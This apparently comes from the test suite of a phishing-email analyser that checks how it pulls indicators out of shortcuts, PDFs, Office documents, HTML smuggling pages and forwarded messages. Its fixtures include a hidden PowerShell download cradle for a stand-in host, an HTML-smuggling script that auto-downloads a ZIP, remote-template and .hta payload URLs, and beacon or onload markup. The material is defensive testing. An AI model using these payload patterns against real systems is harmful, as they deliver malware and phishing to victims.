          ['attachedTemplate', 'file://///three.corp-share.app/share/t.dotm'],
          // A local path, a username and a drive letter name no host.
          ['attachedTemplate', 'file:///opt.local/x.dotm'],
          ['attachedTemplate', 'file://john.doe@four.corp-share.app/t.dotm'],
          ['attachedTemplate', 'file:///C:/x.dotm']
        )
      }
    ])
    const scan = ascii(
      pdf(
        '<< /Type /Catalog >>',
        '<< /A << /S /URI /URI (file://five.corp-share.app/share/doc.pdf) >> >>',
        `<< /A << /S /URI /URI <${hex('\\\\six.corp-share.app\\share\\x.pdf')}> >> >>`
      )
    )
    const mail = mailWith(attached('Template.docx', docx), attached('Scan.pdf', scan, 'application/pdf'))
    const report = await analysePhishing(mail, [], [])
    expect(report.indicators.filter((l) => l.startsWith('domain: '))).toEqual(
      ['one', 'two', 'three', 'five', 'six'].map((n) => `domain: ${n}[.]corp-share[.]app`)
    )
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({ type: 'domain', value: 'one.corp-share.app', note: 'inside Template.docx' })
    expect(iocs).toContainEqual({ type: 'domain', value: 'six.corp-share.app', note: 'inside Scan.pdf' })
  })

  it('scopes a disk image’s caveat to the ZIP directory it turned out to have', async () => {
    const pe = new Uint8Array(64)
    pe.set([0x4d, 0x5a])
    const iso = await analysePhishing(
      mailWith(attached('Invoice.iso', zip([{ name: 'Invoice.exe', data: pe }]))),
      [],
      []
    )
    const [a] = iso.attachments
    // "The files inside it are not listed here", directly above the list of them.
    expect(a.office?.entries.map((e) => e.name)).toEqual(['Invoice.exe'])
    expect(a.facts).not.toContain('disk image — the files inside it are not listed here')
    expect(a.facts).toContain(
      'named as a disk image, but the bytes begin as a ZIP — the entries listed are the ZIP directory’s; a disk image file system in the same bytes is not read here'
    )
    // Nothing read, so the name-only caveat stands.
    const unread = await analysePhishing(mailWith(attached('Invoice.iso', new Uint8Array(64))), [], [])
    expect(unread.attachments[0].facts).toContain('disk image — the files inside it are not listed here')
  })

  it('says an archive, compound file or PDF inside an archive was not opened', async () => {
    const pe = new Uint8Array(64)
    pe.set([0x4d, 0x5a])
    const inner = zip([{ name: 'payload.exe', data: pe }])
    const bytes = zip([
      { name: 'inner.zip', data: inner },
      { name: 'Invoice.docm', data: inner },
      { name: 'setup.exe', data: pe }
    ])
    const lines = structureLines((await analysePhishing(mailWith(attached('files.zip', bytes)), [], [])).attachments[0])
    const line = (name: string): string => lines.find((l) => l.startsWith(`  - inner file \`${name}\``)) ?? ''
    expect(line('inner.zip')).toMatch(/; its own contents are not listed here$/)
    expect(line('Invoice.docm')).toMatch(/; its own contents are not listed here$/)
    expect(line('setup.exe')).toMatch(
      /^ {2}- inner file `setup\.exe`: bytes begin as Windows executable \(MZ\); SHA-256 /
    )
    expect(line('setup.exe')).not.toContain('its own contents')
  })
})

describe('a message’s pictures share one budget', () => {
  it('stops at 64 MB across the attachments, and says so on the ones it did not read', async () => {
    const picture = new Uint8Array(8_000_000)
    picture.set(PNG)
    const packed = await deflateRaw(picture)
    const docx = zip(
      [1, 2, 3, 4].map((n) => ({ name: `word/media/image${n}.png`, data: packed, method: 8, size: picture.length }))
    )
    const mail = mailWith(...Array.from({ length: 20 }, (_, i) => attached(`Pics_${i}.docx`, docx)))
    const report = await analysePhishing(mail, [], [])
    const held = report.attachments.reduce(
      (sum, a) => sum + (a.office?.images ?? []).reduce((n, image) => n + image.bytes.length, 0),
      0
    )
    expect(held).toBeGreaterThan(0)
    expect(held).toBeLessThanOrEqual(64_000_000)
    const last = report.attachments[report.attachments.length - 1]
    expect(last.office?.notes.join(' ')).toContain(
      "this message's budget for pictures, inner files and decompressed PDF data was used up by what was read before them"
    )
  })

  it('charges a PDF’s image streams to the same budget, and names the ones it did not keep', async () => {
    // Two archives inflate the whole 64 MB between them. The PDF after them
    // used to keep its pictures anyway: twenty PDFs held 240 MB.
    const zeros = await deflateRaw(new Uint8Array(8_000_000))
    const archive = zip([1, 2, 3, 4].map((n) => ({ name: `blob${n}.bin`, data: zeros, method: 8, size: 8_000_000 })))
    const jpeg = [0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0xff, 0xd9]
    const scan = new Uint8Array([
      ...ascii('%PDF-1.7\n1 0 obj\n<< /Filter /DCTDecode /Length 13 >>\nstream\n'),
      ...jpeg,
      ...ascii('\nendstream\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n')
    ])
    const report = await analysePhishing(
      mailWith(attached('a.zip', archive), attached('b.zip', archive), attached('scan.pdf', scan, 'application/pdf')),
      [],
      []
    )
    const { pdf: read } = report.attachments[2]
    expect(read?.images).toEqual([])
    expect(read?.notes).toContain(
      "1 image stream was extracted and not kept: this message's budget for pictures, inner files and decompressed PDF data was used up by what was read before it, so it is not hashed or drawn — unread, not absent."
    )
    // Alone, the same PDF keeps its picture and says nothing about a budget.
    const alone = await analysePhishing(mailWith(attached('scan.pdf', scan, 'application/pdf')), [], [])
    expect(alone.attachments[0].pdf?.images).toHaveLength(1)
    expect(formatPhishReport(alone)).not.toMatch(/budget/)
  })

  it('reads every picture of an ordinary message and mentions no budget', async () => {
    const docx = zip([{ name: 'word/media/image1.png', data: PNG }])
    const report = await analysePhishing(
      mailWith(...Array.from({ length: 12 }, (_, i) => attached(`Letter_${i}.docx`, docx))),
      [],
      []
    )
    expect(report.attachments.map((a) => a.office?.images.length)).toEqual(Array.from({ length: 12 }, () => 1))
    expect(formatPhishReport(report)).not.toMatch(/budget/)
  })
})

describe('text the plain scan could not see', () => {
  it('reads a shortcut’s UTF-16 command line, even at an odd offset', async () => {
    const header = [0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]
    const args = '-w hidden -c iwr https://evil-cdn.test/stage2.ps1 -OutFile $env:TEMP\\a.ps1'
    const bytes = new Uint8Array(900).fill(0xff)
    bytes.set(header)
    const at = 601
    for (let i = 0; i < args.length; i++) bytes.set([args.charCodeAt(i), 0], at + i * 2)
    bytes.set([0, 0], at + args.length * 2)
    const report = await analysePhishing(mailWith(attached('Invoice.pdf', bytes, 'application/pdf')), [], [])
    const [a] = report.attachments
    expect(a.facts).toContain('named .pdf but the bytes begin as Windows shortcut (LNK)')
    expect(a.inside).toContain('url: hxxps://evil-cdn[.]test/stage2[.]ps1')
  })

  it('never reads a UTF-16 URL only up to a letter outside ASCII', async () => {
    // `https://ex.test/pa` + Cyrillic т + `h`: cut at the т, the front is a URL the file does not hold.
    const utf16 = (text: string): number[] => [...text].flatMap((c) => [c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8])
    const bytes = new Uint8Array([
      0xff,
      ...utf16('go https://ex.test/pa\u0442h'),
      0,
      0,
      ...utf16('also https://whole.test/ok'),
      0,
      0
    ])
    const report = await analysePhishing(mailWith(attached('note.bin', bytes)), [], [])
    const [a] = report.attachments
    expect(a.inside).toContain('url: hxxps://whole[.]test/ok')
    expect(a.inside.some((l) => l.includes('ex[.]test'))).toBe(false)
  })

  it('finds the script an HTML smuggling page keeps after its blob, and counts its names', async () => {
    const page =
      '<html><body><div id="p">' +
      'UEsDBBQA'.repeat(150_000) +
      '</div><script>var d=atob(document.getElementById("p").textContent);' +
      'var u=URL.createObjectURL(new Blob([d]));var a=document.createElement("a");a.href=u;' +
      'a.download="Invoice.zip";a.click();window.location="https://login-evil.test/done"</script></body></html>'
    const report = await analysePhishing(mailWith(attached('Remittance.html', ascii(page), 'text/html')), [], [])
    const [a] = report.attachments
    expect(a.inside).toContain('url: hxxps://login-evil[.]test/done')
    const census = a.facts.find((f) => f.startsWith('script and markup names found:')) ?? ''
    expect(census).toContain('atob( ×1')
    expect(census).toContain('createObjectURL ×1')
    // Whole at this size, so nothing is said about bytes not scanned.
    expect(a.facts.join(' ')).not.toContain('did not read')
  })

  it('stops the list at 100 and says how many more it found', async () => {
    const text = Array.from({ length: 105 }, (_, i) => `https://host${i}.test/p`).join('\n')
    const report = await analysePhishing(mailWith(attached('list.txt', ascii(text), 'text/plain')), [], [])
    const [a] = report.attachments
    expect(a.inside).toHaveLength(100)
    expect(a.facts).toContain('5 further indicators found inside the file are not listed')
  })

  it('reads the two ends of a larger file, says what it skipped, and never half an indicator', async () => {
    const size = 3_000_000
    const bytes = new Uint8Array(size).fill(0x7a) // 'z': no word break, no hex digit, no dot
    const put = (at: number, text: string): void => bytes.set(ascii(text), at)
    put(0, 'start https://head-side.example.com/x\n')
    // Straddles the end of the first window: cut there, it would be a URL the file does not hold.
    put(1_000_000 - 10, ' https://edge-cut.example.com/abcdefghijklmnop ')
    put(1_500_000, ' https://middle.example.com/m ')
    put(size - 100, ' https://tail-side.example.com/t\n')
    const report = await analysePhishing(mailWith(attached('big.txt', bytes, 'text/plain')), [], [])
    const [a] = report.attachments
    expect(a.inside).toContain('url: hxxps://head-side[.]example[.]com/x')
    expect(a.inside).toContain('url: hxxps://tail-side[.]example[.]com/t')
    expect(a.inside.some((l) => /middle|edge-cut/.test(l))).toBe(false)
    const said = a.facts.find((f) => f.startsWith('the text scan for indicators')) ?? ''
    const [head, tail, between] = [...said.matchAll(/\d[\d,]*/g)].map((m) => Number(m[0].replace(/,/g, '')))
    // No structure reader read this file, so the sentence names none.
    expect(said).toMatch(/; it did not read the [\d,]+ bytes between$/)
    expect(head).toBeLessThanOrEqual(1_000_000)
    expect(tail).toBeLessThanOrEqual(1_000_000)
    expect(head + tail + between).toBe(size)
  })

  it('scopes what it skipped to the text scan, beside a link the PDF reader found in those bytes', async () => {
    // "Not scanned for indicators" sat beside an indicator found in exactly those bytes.
    const filler = `% ${'z'.repeat(1_400_000)}\n`
    const bytes = ascii(
      `%PDF-1.7\n1 0 obj\n<< /Type /Catalog >>\nendobj\n${filler}` +
        `2 0 obj\n<< /A << /S /URI /URI (https://mid-lure.test/x) >> >>\nendobj\n${filler}` +
        'trailer\n<< /Root 1 0 R >>\n%%EOF\n'
    )
    const report = await analysePhishing(mailWith(attached('Big.pdf', bytes, 'application/pdf')), [], [])
    const [a] = report.attachments
    expect(report.indicators).toContain('url: hxxps://mid-lure[.]test/x')
    const said = a.facts.find((f) => f.startsWith('the text scan for indicators')) ?? ''
    expect(said).toMatch(
      /^the text scan for indicators, script names and RTF markers read the first [\d,]+ and the last [\d,]+ bytes; it did not read the [\d,]+ bytes between; the PDF structure reader read this file separately, and its lines are listed separately$/
    )
    expect(a.facts.join(' ')).not.toContain('not scanned for indicators')
  })
})

describe('a shortcut’s strings, read by their own counts', () => {
  const HAS = { workingDir: 0x10, arguments: 0x20, iconLocation: 0x40 }
  const utf16 = (text: string): number[] => [...text].flatMap((c) => [c.charCodeAt(0) & 0xff, c.charCodeAt(0) >> 8])

  /**
   * A shortcut laid out as MS-SHLLINK has it: the 76-byte header with its
   * flags, an optional ID list, StringData (each string led by a count and
   * carrying no terminator), then ExtraData.
   */
  function shortcut(
    strings: [flag: number, text: string][],
    { unicode = true, idList = 0, extra = [0, 0, 0, 0] }: { unicode?: boolean; idList?: number; extra?: number[] } = {}
  ): Uint8Array {
    const out = [0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]
    out.push(...new Uint8Array(0x4c - out.length))
    let flags = unicode ? 0x80 : 0
    if (idList) {
      flags |= 0x01
      out.push(idList & 0xff, idList >> 8, ...new Uint8Array(idList))
    }
    for (const [flag, text] of strings) {
      flags |= flag
      out.push(text.length & 0xff, text.length >> 8, ...(unicode ? utf16(text) : [...ascii(text)]))
    }
    out.push(...extra)
    out[0x14] = flags
    return Uint8Array.from(out)
  }

  const inside = async (bytes: Uint8Array): Promise<string[]> =>
    (await analysePhishing(mailWith(attached('Invoice.lnk', bytes)), [], [])).attachments[0].inside

  const URL33 = 'https://evil-cdn.test/payload.hta'
  // Counts of 33 and 57 read as '!' and '9', which a URL runs on into.
  const ICON33 = '%SystemRoot%\\System32\\SHELL32.dll'
  const ICON57 = '%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe'

  it('never runs the arguments into the icon path’s count', async () => {
    expect([URL33.length, ICON33.length, ICON57.length]).toEqual([33, 33, 57])
    const a = await inside(
      shortcut([
        [HAS.workingDir, 'C:\\Windows\\System32'],
        [HAS.arguments, 'https://lnk.evil.example/invoice/view.hta'],
        [HAS.iconLocation, ICON33]
      ])
    )
    expect(a).toContain('url: hxxps://lnk[.]evil[.]example/invoice/view[.]hta')
    expect(a.join(' ')).not.toContain('SystemRoot')

    const b = await inside(
      shortcut([
        [HAS.arguments, URL33],
        [HAS.iconLocation, ICON57]
      ])
    )
    expect(b).toContain('url: hxxps://evil-cdn[.]test/payload[.]hta')
    expect(b.join(' ')).not.toContain('ProgramFiles')
  })

  it('finds a URL whose count reads as a letter glued to the string before it', async () => {
    const url = 'https://evil-cdn.test/invoice/2026/09/remittance-advice-931/view.hta'
    expect(url.length).toBe(68) // 'D'
    const found = await inside(
      shortcut([
        [HAS.workingDir, 'C:\\Windows\\System32'],
        [HAS.arguments, url]
      ])
    )
    expect(found).toContain('url: hxxps://evil-cdn[.]test/invoice/2026/09/remittance-advice-931/view[.]hta')
  })

  it('ends the arguments where their count says, whatever block follows', async () => {
    const environment = [0x14, 0x03, 0, 0, 0x01, 0, 0, 0xa0, ...new Uint8Array(780), 0, 0, 0, 0]
    const tracker = [0x60, 0, 0, 0, 0x03, 0, 0, 0xa0, 0x58, 0, 0, 0, 0, 0, 0, 0]
    tracker.push(...ascii('desktop-7'), ...new Uint8Array(7 + 64), 0, 0, 0, 0)
    expect([environment.length, tracker.length]).toEqual([0x314 + 4, 0x60 + 4])
    for (const [extra, idList] of [
      [environment, 0],
      // An odd ID list puts every string at an odd offset.
      [tracker, 5]
    ] as const) {
      const found = await inside(shortcut([[HAS.arguments, URL33]], { extra: [...extra], idList }))
      expect(found).toEqual(['url: hxxps://evil-cdn[.]test/payload[.]hta'])
    }
  })

  it('reads an ANSI shortcut’s strings the same way', async () => {
    const found = await inside(
      shortcut(
        [
          [HAS.arguments, URL33],
          [HAS.iconLocation, ICON57]
        ],
        { unicode: false }
      )
    )
    expect(found).toContain('url: hxxps://evil-cdn[.]test/payload[.]hta')
    expect(found.join(' ')).not.toContain('hta9')
  })

  it('never takes a letter whose low byte is a control code for the end of a URL', async () => {
    // Д is 14 04: read by its low byte alone it ended the URL as if whole.
    const bytes = new Uint8Array([0xff, ...utf16('Open https://files.example.com/Документы today'), 0, 0])
    const found = (await analysePhishing(mailWith(attached('note.bin', bytes)), [], [])).attachments[0].inside
    expect(found.some((l) => l.includes('files[.]example'))).toBe(false)
  })
})

describe('a PDF link written with escapes', () => {
  it('is not read, raw, as the front of its URL and a tail after the escape', async () => {
    for (const uri of ['https://ev\\151l.com/a', 'https://ev\\(il.com/a', 'https://evil.exa\\\nmple.com/p']) {
      const bytes = ascii(
        pdf(
          '<< /Type /Catalog >>',
          `<< /A << /S /URI /URI (${uri}) >> >>`,
          '<< /Title (mirror at 1.2.3.4 and good.com/) >>'
        )
      )
      const [a] = (await analysePhishing(mailWith(attached('Scan.pdf', bytes, 'application/pdf')), [], [])).attachments
      expect(a.pdf?.uris).toHaveLength(1)
      // The decoded link is on the card as a PDF link; nothing of it belongs here.
      expect(a.inside.join(' ')).not.toMatch(/hxxps:\/\/ev|151l|mple/)
      // Values the file really holds outside the link are still listed.
      expect(a.inside).toContain('ip: 1[.]2[.]3[.]4')
      expect(a.inside.join(' ')).toContain('good[.]com')
    }
  })
})

describe('a legacy Office document', () => {
  /** A version 3 compound file: header, one FAT sector, one directory sector. */
  function compound(entries: [name: string, type: number][]): Uint8Array {
    const bytes = new Uint8Array(512 * 3)
    const view = new DataView(bytes.buffer)
    bytes.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
    view.setUint16(0x1e, 9, true)
    view.setUint32(0x2c, 1, true)
    view.setUint32(0x30, 1, true)
    for (let i = 0; i < 109; i++) view.setUint32(0x4c + i * 4, i === 0 ? 0 : 0xffffffff, true)
    for (let i = 0; i < 128; i++) view.setUint32(512 + i * 4, 0xffffffff, true)
    view.setUint32(512, 0xfffffffd, true) // sector 0 is the FAT
    view.setUint32(516, 0xfffffffe, true) // sector 1 is the whole directory
    entries.forEach(([name, type], slot) => {
      const at = 1024 + slot * 128
      for (let i = 0; i < name.length; i++) view.setUint16(at + i * 2, name.charCodeAt(i), true)
      view.setUint16(at + 0x40, (name.length + 1) * 2, true)
      bytes[at + 0x42] = type
    })
    return bytes
  }

  it('lists what its directory names, and says which names are macro storage', async () => {
    const doc = compound([
      ['Root Entry', 5],
      ['Macros', 1],
      ['WordDocument', 2]
    ])
    const report = await analysePhishing(mailWith(attached('Invoice.doc', doc, 'application/msword')), [], [])
    const [a] = report.attachments
    expect(a.ole?.entries.map((e) => e.name)).toEqual(['Root Entry', 'Macros', 'WordDocument'])
    const md = formatPhishReport(report)
    expect(md).toContain('  - 3 entries read from the compound-file directory')
    expect(md).toContain('  - the compound-file directory lists storage `Macros`: named as VBA macro storage')
    expect(md).not.toContain('embedded picture')
  })

  it('names an encrypted Office file for what its bytes and directory say', async () => {
    // A password-protected .xlsx is a compound file, not a legacy document,
    // and nothing said its contents were encrypted.
    const bytes = compound([
      ['Root Entry', 5],
      ['\u0006DataSpaces', 1],
      ['EncryptionInfo', 2],
      ['EncryptedPackage', 2]
    ])
    const mail = mailWith(attached('Remittance.xlsx', bytes)).replace('see attached', 'The password is 1234')
    const md = formatPhishReport(await analysePhishing(mail, [], []))
    expect(md).toContain('named .xlsx but the bytes begin as OLE compound file')
    expect(md).toContain(
      'lists stream `EncryptedPackage`: named as an encrypted Office package, whose contents cannot be read here'
    )
  })
})

describe('end to end, on files shaped like the real thing', () => {
  it('reads a macro document: its project, its remote template and its picture', async () => {
    const vba = new Uint8Array(512)
    vba.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
    const settings = rels(['attachedTemplate', 'https://cdn-invoices.test/tpl/remote.dotm'])
    const packed = await deflateRaw(settings)
    const docm = zip([
      { name: '[Content_Types].xml', data: ascii('<Types/>') },
      { name: 'word/document.xml', data: ascii('<w:document/>') },
      { name: 'word/_rels/settings.xml.rels', data: packed, method: 8, size: settings.length },
      { name: 'word/vbaProject.bin', data: vba },
      { name: 'word/media/image1.png', data: PNG }
    ])
    const mail = mailWith(attached('Invoice_0931.docm', docm, 'application/vnd.ms-word.document.macroEnabled.12'))
    const report = await analysePhishing(mail, [], [])
    const [a] = report.attachments
    const vbaHash = await hashBytes(vba)
    const md = formatPhishReport(report)
    expect(a.facts).toContain('file type that can carry macros')
    expect(md).toContain('  - 5 entries read from the ZIP directory')
    expect(md).toContain('  - entry `word/vbaProject.bin`: named as a VBA macro project')
    expect(md).toContain(
      '  - external target: `hxxps://cdn-invoices[.]test/tpl/remote[.]dotm` — relationship type `attachedTemplate`, declared in `word/_rels/settings.xml.rels`'
    )
    expect(md).toContain(
      `  - inner file \`word/vbaProject.bin\`: bytes begin as OLE compound file; SHA-256 ${vbaHash} (computed here); its own contents are not listed here`
    )
    expect(md).toMatch(
      /embedded picture `word\/media\/image1\.png`: PNG image, 16 bytes, SHA-256 [0-9a-f]{64} \(computed here\)/
    )
    expect(report.indicators).toContain('url: hxxps://cdn-invoices[.]test/tpl/remote[.]dotm')
    expect(report.indicators).toContain(`hash: ${vbaHash}`)
    // Shown once, where it was found — not again under "found inside the file".
    expect(a.inside.some((l) => l.includes('remote[.]dotm'))).toBe(false)
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({
      type: 'url',
      value: 'https://cdn-invoices.test/tpl/remote.dotm',
      note: 'inside Invoice_0931.docm'
    })
    expect(iocs).toContainEqual({
      type: 'hash',
      value: vbaHash,
      note: 'word/vbaProject.bin inside Invoice_0931.docm (hashed here)'
    })
  })

  it('states a reader that broke as a fact about the file, and keeps the hashes', async () => {
    pdfReader.throws = true
    try {
      const bytes = ascii(pdf('<< /Type /Catalog >>'))
      const report = await analysePhishing(mailWith(attached('scan.pdf', bytes, 'application/pdf')), [], [])
      const [a] = report.attachments
      expect(a.facts).toContain('the PDF structure reader stopped on this file, so its contents are not listed')
      expect('pdf' in a).toBe(false)
      expect(a.sha256).toBe(await hashBytes(bytes))
    } finally {
      pdfReader.throws = false
    }
  })

  it('lists fifty PDF links, counts the rest, and puts every one in the indicators', async () => {
    const links = Array.from({ length: 60 }, (_, i) => `<< /A << /S /URI /URI (https://l${i}.test/x) >> >>`)
    const report = await analysePhishing(
      mailWith(attached('links.pdf', ascii(pdf('<< /Type /Catalog >>', ...links)), 'application/pdf')),
      [],
      []
    )
    const lines = structureLines(report.attachments[0])
    expect(lines.filter((l) => l.startsWith('  - PDF link (/URI): '))).toHaveLength(50)
    expect(lines).toContain('  - 10 further PDF links are not listed')
    for (let i = 0; i < 60; i++) expect(report.indicators).toContain(`url: hxxps://l${i}[.]test/x`)
  })
})

describe('a forwarded message’s own headers', () => {
  const FORWARD = [
    'From: user@corp.test',
    'To: soc@corp.test',
    'Subject: FW: MFA re-enrolment',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="OUT"',
    '',
    '--OUT',
    'Content-Type: text/plain',
    '',
    'Reporting this.',
    '--OUT',
    'Content-Type: message/rfc822',
    'Content-Disposition: attachment; filename="original.eml"',
    '',
    'Received: from mail.m1crosoft-verify.test (mail.m1crosoft-verify.test [198.51.100.23])',
    '\tby mx.corp.test with ESMTP id 7a1; Thu, 24 Sep 2026 08:02:11 +0000',
    'From: "Microsoft 365" <it@m1crosoft-verify.test>',
    'Subject: MFA re-enrolment required',
    'Content-Type: text/plain',
    '',
    'Scan the QR code in the attached PDF to keep your account.',
    '',
    '--OUT--',
    ''
  ].join('\n')

  it('reach the indicators and the case, noted as that message’s', async () => {
    // The phisher's From and originating IP were only on the attachment's
    // card, so a case opened from the reporter's mail carried neither.
    const report = await analysePhishing(FORWARD, [], [])
    expect(report.indicators).toContain('ip: 198[.]51[.]100[.]23')
    expect(report.indicators).toContain('email: it[at]m1crosoft-verify[.]test')
    const iocs = caseIocs(report, FORWARD)
    expect(iocs).toContainEqual({ type: 'ip', value: '198.51.100.23', note: 'in the headers of original.eml' })
    expect(iocs).toContainEqual({
      type: 'email',
      value: 'it@m1crosoft-verify.test',
      note: 'in the headers of original.eml'
    })
  })

  it('keeps its text apart from the reporter’s, under its own name', async () => {
    // The phisher's sentence was printed as the reporter's own body.
    const report = await analysePhishing(FORWARD, [], [])
    expect(report.text).toBe('Reporting this.')
    expect(report.forwarded.map((f) => f.origin)).toEqual(['original.eml'])
    expect(report.forwarded[0].text).toContain('Scan the QR code')
    const md = formatPhishReport(report)
    const [outer, inner] = md.split('Text of the attached message `original.eml`:')
    expect(outer).toContain('Reporting this.')
    expect(outer).not.toContain('Scan the QR code')
    expect(inner).toContain('Scan the QR code')
  })

  it('says its hash is of bytes rebuilt from text, where the case keeps it', async () => {
    // A message/rfc822 part is never base64 or quoted-printable, so its bytes
    // are always the text as read.
    const report = await analysePhishing(FORWARD, [], [])
    const [eml] = report.attachments
    expect(eml.exact).toBe(false)
    expect(eml.facts).toContain(REBUILT_FACT)
    expect(caseIocs(report, FORWARD)).toContainEqual({
      type: 'hash',
      value: eml.sha256,
      note: 'original.eml (hashed here from its text as read; may not match the file as sent)'
    })
  })

  const NESTED = (disposition: string, outerHtml = ''): string =>
    [
      'From: user@corp.test',
      'Subject: FW: payment',
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="OUT"',
      '',
      '--OUT',
      `Content-Type: ${outerHtml ? 'text/html' : 'text/plain'}`,
      '',
      outerHtml || 'Reporting this.',
      '--OUT',
      'Content-Type: message/rfc822',
      disposition,
      '',
      'Received: from mx.evil.example (mx.evil.example [203.0.113.9])',
      '\tby mx.corp.test; Thu, 24 Sep 2026 08:02:11 +0000',
      'From: attacker@evil.example',
      'Subject: Invoice',
      'Content-Type: multipart/mixed; boundary="IN"',
      '',
      '--IN',
      'Content-Type: text/html',
      '',
      '<p>Pay at https://pay.evil.example/login or reply to billing@pay-desk.example</p>',
      '--IN',
      'Content-Type: application/octet-stream; name="payload.exe"',
      'Content-Disposition: attachment; filename="payload.exe"',
      'Content-Transfer-Encoding: base64',
      '',
      btoa('MZ payload'),
      '--IN--',
      '',
      '--OUT--',
      ''
    ].join('\n')

  it('names the message each link, value and payload came out of', async () => {
    const mail = NESTED('Content-Disposition: attachment; filename="fwd.eml"')
    const report = await analysePhishing(mail, [], [])
    const link = report.links.find((l) => l.target === 'https://pay.evil.example/login')
    expect(link?.origin).toBe('fwd.eml')
    const payload = report.attachments.find((a) => a.filename === 'payload.exe')
    expect(payload?.origin).toBe('fwd.eml')
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({
      type: 'url',
      value: 'https://pay.evil.example/login',
      note: 'in the body of fwd.eml'
    })
    expect(iocs).toContainEqual({ type: 'email', value: 'billing@pay-desk.example', note: 'in the body of fwd.eml' })
    expect(iocs).toContainEqual({
      type: 'hash',
      value: payload?.sha256,
      note: 'payload.exe inside fwd.eml (hashed here)'
    })
    expect(iocs).toContainEqual({ type: 'ip', value: '203.0.113.9', note: 'in the headers of fwd.eml' })
    const md = formatPhishReport(report)
    expect(md).toContain('- `hxxps://pay[.]evil[.]example/login`\n  - in the body of `fwd.eml`')
    expect(md).toContain('- `payload.exe` inside `fwd.eml` — `application/octet-stream`, 10 bytes')
  })

  it('reads an attached message that has no name, and gives it a row', async () => {
    const mail = NESTED('Content-Disposition: inline')
    const report = await analysePhishing(mail, [], [])
    expect(report.attachments.map((a) => a.contentType)).toContain('message/rfc822')
    expect(report.indicators).toContain('ip: 203[.]0[.]113[.]9')
    expect(report.indicators).toContain('email: attacker[at]evil[.]example')
    const iocs = caseIocs(report, mail)
    expect(iocs).toContainEqual({ type: 'ip', value: '203.0.113.9', note: 'in the headers of an attached message' })
    const payload = report.attachments.find((a) => a.filename === 'payload.exe')
    expect(iocs).toContainEqual({
      type: 'hash',
      value: payload?.sha256,
      note: 'payload.exe inside an attached message (hashed here)'
    })
  })

  it('is not hidden by a comment the outer HTML leaves open', async () => {
    const report = await analysePhishing(
      NESTED('Content-Disposition: attachment; filename="fwd.eml"', '<p>See attached.</p><!--'),
      [],
      []
    )
    expect(report.htmlText).toBe('See attached.')
    expect(report.forwarded[0].htmlText).toContain('Pay at https://pay.evil.example/login')
  })
})

describe('the Links section says what it read', () => {
  it('names the derived domain for what it is', async () => {
    // Under an unlisted country suffix the domain line named the suffix itself.
    const md = formatPhishReport(
      await analysePhishing(
        'Content-Type: text/plain\n\nSign in at https://secure.bank-verify.co.id/login today',
        [],
        []
      )
    )
    expect(md).toContain('  - derived domain `bank-verify[.]co[.]id`')
    expect(md).toContain(
      'Derived domain = the host’s last two labels, or three under a two-label suffix; no public suffix list is consulted, so under a hosting platform (pages.dev, github.io) it names the platform, not the site’s owner.'
    )
  })

  it('is scoped to the message text, and points at the attachments whenever there are any', async () => {
    // "Links: None found." sat above an Attachments section holding the lure.
    const lure = ascii(pdf('<< /Type /Catalog >>', '<< /A << /S /URI /URI (https://pdf-lure.test/x) >> >>'))
    const page = ascii('<html><body><a href="https://html-lure.test/x">open</a></body></html>')
    const md = formatPhishReport(
      await analysePhishing(
        mailWith(attached('Scan.pdf', lure, 'application/pdf'), attached('Remittance.html', page, 'text/html')),
        [],
        []
      )
    )
    expect(md).toContain(
      '### Links in the message text\n\nNone found in the message text.\n\n' +
        'Anything found inside an attachment or an inline image is listed with that file, under Attachments or Inline images.\n\n### Attachments'
    )
    const bare = formatPhishReport(await analysePhishing('Content-Type: text/plain\n\nno links here', [], []))
    expect(bare).toContain('### Links in the message text\n\nNone found in the message text.\n\n### Attachments')
  })

  it('points at the inline images too, when they are all the mail carries', async () => {
    // A logo holding a beacon URL: the pointer was missing, and "under
    // Attachments" would have named a section that says None.
    const png = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0x0d, 0x49, 0x48, 0x44, 0x52]
    const logo = Uint8Array.from([...png, ...ascii(' https://beacon.evil.test/p?id=42 ')])
    const report = await analysePhishing(
      mailWith({
        headers: ['Content-Type: image/png', 'Content-Disposition: inline; filename="logo.png"', 'Content-ID: <logo>'],
        bytes: logo
      }),
      [],
      []
    )
    expect([report.attachments.length, report.inlineImages.length]).toEqual([0, 1])
    expect(report.inlineImages[0].inside.join(' ')).toContain('beacon[.]evil[.]test')
    const pointer =
      'Anything found inside an attachment or an inline image is listed with that file, under Attachments or Inline images.'
    expect(linksSection(report).notes).toEqual([pointer])
    expect(formatPhishReport(report)).toContain(`None found in the message text.\n\n${pointer}\n\n### Attachments`)
  })
})

describe('the report keeps markup and images inside code', () => {
  it('leaves no tag or image opener outside a fence or a code span', async () => {
    // A case note fences a description that has one anywhere outside code, so
    // every sender value has to stay quoted for the report to render as written.
    const hostile = '<img src="https://beacon.test/s.gif"> ![p](https://beacon.test/i.png)'
    const mail = [
      `From: "${hostile}" <a@evil.test>`,
      `Subject: ${hostile}`,
      'MIME-Version: 1.0',
      'Content-Type: multipart/mixed; boundary="B"',
      '',
      '--B',
      'Content-Type: text/html',
      '',
      `<p>${hostile}</p><a href="https://evil.test/x">https://bank.test/</a>`,
      '--B',
      `Content-Type: application/octet-stream; name="<img src=x>.pdf"`,
      `Content-Disposition: attachment; filename="<img src=x>![a](b).pdf"`,
      'Content-Transfer-Encoding: base64',
      '',
      base64(ascii(`${hostile} https://inside.test/<svg/onload=x>`)),
      '--B--',
      ''
    ].join('\n')
